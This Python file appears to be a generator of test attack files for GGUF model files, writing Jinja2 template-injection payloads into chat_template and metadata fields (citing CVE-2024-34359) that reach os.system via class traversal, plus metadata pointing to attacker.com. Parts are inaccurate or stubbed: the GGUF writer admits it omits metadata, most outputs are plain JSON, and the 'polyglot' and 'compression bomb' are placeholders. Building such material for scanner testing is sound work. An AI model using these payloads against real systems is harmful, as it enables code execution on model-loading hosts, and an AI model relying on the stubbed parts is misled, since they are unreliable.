"""
GGUF Attack Vector Generator

Generates basic and advanced attack vectors for GGUF quantized models:
- .gguf files
- .ggml files
- Template injection (CVE-2024-34359)
- Metadata poisoning

Attack Types:
1. Basic: Simple Jinja2 injection in chat_template
2. Advanced: Expression traversal, multi-layer exploitation
"""

import json
import struct
from pathlib import Path
from typing import List, Dict, Tuple


class GGUFAttackGenerator:
    """Generate GGUF-based attack vectors."""
    
    def __init__(self, output_dir: str = "./output"):
        """Initialize the GGUF attack generator.
        
        Args:
            output_dir: Directory to save generated attack vectors
        """
        self.output_dir = Path(output_dir) / "gguf_vectors"
        self.output_dir.mkdir(parents=True, exist_ok=True)
        self.generated_files = []
    
    def _create_gguf_metadata(self, chat_template: str) -> bytes:
        """Create minimal GGUF file with custom chat_template.
        
        GGUF Format: Magic (4) + Version (4) + Metadata + Tensor data
        
        Args:
            chat_template: The template string to embed
            
        Returns:
            GGUF file bytes
        """
        magic = b"GGUF"
        version = struct.pack("<I", 3)  # GGUF version 3
        
        # Create metadata dict
        metadata = {
            "general.name": "malicious-model",
            "tokenizer.chat_template": chat_template,
        }
        
        # Serialize metadata (simplified)
        metadata_bytes = b""
        metadata_count = struct.pack("<I", len(metadata))
        
        # For simplicity, return basic structure
        # Real GGUF parsing is more complex
        gguf_data = magic + version + metadata_count
        
        return gguf_data
    
    def generate_basic_ssti(self) -> Tuple[str, int]:
        """Generate basic Jinja2 SSTI in chat_template.
        
        Attack Vector: CVE-2024-34359
            Jinja2 template injection in chat_template field:
            {{ 7*7 }} → evaluates to 49
            More complex: {{ config.__class__ }} → access internals
        
        Severity: CRITICAL
        Impact: RCE via template evaluation
        Reference: CVE-2024-34359 (llama-cpp-python)
        
        Returns:
            Tuple of (filepath, payload_count)
        """
        config = {
            "general.name": "model",
            "tokenizer.chat_template": "{{ 7*7 }}",  # Simple math
        }
        
        filepath = self.output_dir / "01_basic_ssti.json"
        with open(filepath, 'w') as f:
            json.dump(config, f, indent=2)
        
        self.generated_files.append(str(filepath))
        
        return str(filepath), 1
    
    def generate_class_traversal_ssti(self) -> Tuple[str, int]:
        """Generate SSTI with Python class hierarchy traversal.
        
        Attack Vector:
            Access Python internals via template:
            {{ config.__class__.__bases__[0].__subclasses__() }}
            → Gets all subclasses of object
            → Can find dangerous classes like os, subprocess
        
        Severity: CRITICAL
        Sophistication: Medium
        Impact: Class enumeration leading to RCE
        
        Returns:
            Tuple of (filepath, payload_count)
        """
        ssti_payload = (
            "{{ config.__class__.__bases__[0].__subclasses__() }}"
        )
        
        config = {
            "general.name": "model",
            "tokenizer.chat_template": ssti_payload,
        }
        
        filepath = self.output_dir / "02_class_traversal_ssti.json"
        with open(filepath, 'w') as f:
            json.dump(config, f, indent=2)
        
        self.generated_files.append(str(filepath))
        
        return str(filepath), 1
    
    def generate_module_access_ssti(self) -> Tuple[str, int]:
        """Generate SSTI with module access.
        
        Attack Vector:
            Access system modules via globals:
            {{ config.__class__.__bases__[0].__subclasses__()[104].__init__.__globals__['sys'] }}
            → Get sys module
            → Get os module
            → Call os.system()
        
        Severity: CRITICAL
        Sophistication: High
        Impact: Direct command execution
        
        Returns:
            Tuple of (filepath, payload_count)
        """
        ssti_payload = (
            "{{ config.__class__.__bases__[0].__subclasses__()[104]"
            ".__init__.__globals__['sys'].modules['os'].system('id') }}"
        )
        
        config = {
            "general.name": "model",
            "tokenizer.chat_template": ssti_payload,
        }
        
        filepath = self.output_dir / "03_module_access_ssti.json"
        with open(filepath, 'w') as f:
            json.dump(config, f, indent=2)
        
        self.generated_files.append(str(filepath))
        
        return str(filepath), 1
    
    def generate_builtin_filter_ssti(self) -> Tuple[str, int]:
        """Generate SSTI using Jinja2 filters.
        
        Attack Vector:
            Jinja2 filters that evaluate code:
            {{ payload|eval }}
            {{ payload|exec }}
            {{ 'os'|import }}  (if available)
        
        Severity: CRITICAL
        Filters: eval, exec, attr, getattr
        
        Returns:
            Tuple of (filepath, payload_count)
        """
        payloads = [
            '{{ "__import__(\'os\').system(\'id\')"| eval}}',
            '{{ "import os; os.system(\'whoami\')" | exec }}',
            '{{ dict()|attr("__init__")|attr("__globals__")["sys"] }}',
        ]
        
        config = {
            "general.name": "model",
            "tokenizer.chat_template": payloads[0],  # Primary payload
            "alternative_templates": payloads[1:],  # Alternatives
        }
        
        filepath = self.output_dir / "04_builtin_filter_ssti.json"
        with open(filepath, 'w') as f:
            json.dump(config, f, indent=2)
        
        self.generated_files.append(str(filepath))
        
        return str(filepath), len(payloads)
    
    def generate_multiline_ssti(self) -> Tuple[str, int]:
        """Generate multi-line SSTI bypassing newline filters.
        
        Attack Vector:
            Complex multi-line template:
            {%- set x = os.system('malicious') -%}
            {% for item in items %}...{% endfor %}
            Bypasses simple string matching
        
        Severity: CRITICAL
        Evasion: Multiline/comment-based obfuscation
        
        Returns:
            Tuple of (filepath, payload_count)
        """
        ssti_payload = """{%- set os = __import__('os') -%}
{%- set result = os.system('id') -%}
{{ result }}"""
        
        config = {
            "general.name": "model",
            "tokenizer.chat_template": ssti_payload,
        }
        
        filepath = self.output_dir / "05_multiline_ssti.json"
        with open(filepath, 'w') as f:
            json.dump(config, f, indent=2)
        
        self.generated_files.append(str(filepath))
        
        return str(filepath), 1
    
    def generate_metadata_injection(self) -> Tuple[str, int]:
        """Generate metadata field injection.
        
        Attack Vector:
            Injecting code in various metadata fields:
            - general.description: Code string
            - general.url: URL pointing to malicious resource
            - tokenizer.ggml_vocab_type: Injection point
            - unknown.malicious_field: Custom field with payload
        
        Severity: HIGH
        Detection: Metadata validation
        
        Returns:
            Tuple of (filepath, injection_count)
        """
        config = {
            "general.name": "model",
            "general.description": "__import__('os').system('id')",
            "general.url": "http://attacker.com/download",
            "tokenizer.ggml_vocab_type": "{{ 7*7 }}",
            "custom.payload": "{{ config.__class__.__bases__[0].__subclasses__()[104].__init__.__globals__['os'].system('whoami') }}",
        }
        
        filepath = self.output_dir / "06_metadata_injection.json"
        with open(filepath, 'w') as f:
            json.dump(config, f, indent=2)
        
        self.generated_files.append(str(filepath))
        
        injection_count = sum(
            1 for v in config.values()
            if '__import__' in str(v) or '{{' in str(v)
        )
        
        return str(filepath), injection_count
    
    def generate_compression_bomb(self) -> Tuple[str, int]:
        """Generate GGUF with compression bomb payload.
        
        Attack Vector:
            Tensor data with:
            1. Large tensors with repetitive patterns
            2. Extreme compression after decompression
            3. Memory exhaustion during loading
            4. Decompression bomb pattern
        
        Severity: MEDIUM (DoS)
        Impact: Memory/CPU exhaustion
        
        Returns:
            Tuple of (filepath, compression_ratio)
        """
        config = {
            "general.name": "bomb-model",
            "tensor.size": 1000000,  # Claims 1MB tensor
            "compression.ratio": 100,  # But compresses to 10KB
            "data": "A" * 100,  # Placeholder for actual data
        }
        
        filepath = self.output_dir / "07_compression_bomb.json"
        with open(filepath, 'w') as f:
            json.dump(config, f, indent=2)
        
        self.generated_files.append(str(filepath))
        
        return str(filepath), 100
    
    def generate_polyglot_gguf(self) -> Tuple[str, int]:
        """Generate polyglot GGUF (GGUF + other format).
        
        Attack Vector:
            File that is simultaneously:
            1. Valid GGUF format
            2. Valid tar.gz archive
            3. Valid ZIP archive
            4. Each parser sees different content
            5. Bypasses format validation
        
        Severity: MEDIUM
        Evasion: Format confusion
        
        Returns:
            Tuple of (filepath, format_count)
        """
        # Create a minimal valid GGUF header
        gguf_header = b"GGUF" + struct.pack("<I", 3)  # GGUF v3
        
        config = {
            "general.name": "polyglot-model",
            "tokenizer.chat_template": "{{ payload }}",
        }
        config_json = json.dumps(config).encode()
        
        filepath = self.output_dir / "08_polyglot_gguf.bin"
        
        with open(filepath, 'wb') as f:
            # Write GGUF header
            f.write(gguf_header)
            # Write polyglot payload
            f.write(config_json)
        
        self.generated_files.append(str(filepath))
        
        return str(filepath), 2
    
    def generate_escaped_template(self) -> Tuple[str, int]:
        """Generate SSTI that overcomes escape attempts.
        
        Attack Vector:
            Template using advanced escaping bypass:
            1. Using format strings: %s, %x
            2. Using backticks: `expression`
            3. Using alternative operators
            4. Using attribute/item access alternatives
        
        Severity: CRITICAL
        Sophistication: High
        
        Returns:
            Tuple of (filepath, payload_count)
        """
        payloads = [
            # Escaping bypass attempts
            "{{ ''['\x5f\x5fclass\x5f\x5f']  }}",  # Hex encoded
            "{{ request.environ['LD_PRELOAD'] }}",  # Environment
            "{{ cycler.__init__.__globals__.os.system('id') }}",
            "{{ config.items() | map(attribute=0) }}",
        ]
        
        config = {
            "general.name": "model",
            "tokenizer.chat_template": payloads[0],
            "alternative_payloads": payloads[1:],
        }
        
        filepath = self.output_dir / "09_escaped_template.json"
        with open(filepath, 'w') as f:
            json.dump(config, f, indent=2)
        
        self.generated_files.append(str(filepath))
        
        return str(filepath), len(payloads)
    
    def generate_all(self) -> Dict[str, Tuple[str, int]]:
        """Generate all GGUF attack vectors.
        
        Returns:
            Dictionary mapping attack names to results
        """
        results = {
            "basic_ssti": self.generate_basic_ssti(),
            "class_traversal": self.generate_class_traversal_ssti(),
            "module_access": self.generate_module_access_ssti(),
            "builtin_filters": self.generate_builtin_filter_ssti(),
            "multiline_ssti": self.generate_multiline_ssti(),
            "metadata_injection": self.generate_metadata_injection(),
            "compression_bomb": self.generate_compression_bomb(),
            "polyglot_gguf": self.generate_polyglot_gguf(),
            "escaped_template": self.generate_escaped_template(),
        }
        return results
    
    def get_generated_files(self) -> List[str]:
        """Get list of all generated files."""
        return self.generated_files


if __name__ == "__main__":
    generator = GGUFAttackGenerator(output_dir="./output")
    results = generator.generate_all()
    print("\n=== GGUF Attack Vectors Generated ===")
    print("(CVE-2024-34359 - Jinja2 Template Injection)")
    for attack_name, (filepath, metric) in results.items():
        print(f"✓ {attack_name:20} → {filepath} (count: {metric})")
    print(f"\nTotal files generated: {len(generator.get_generated_files())}")
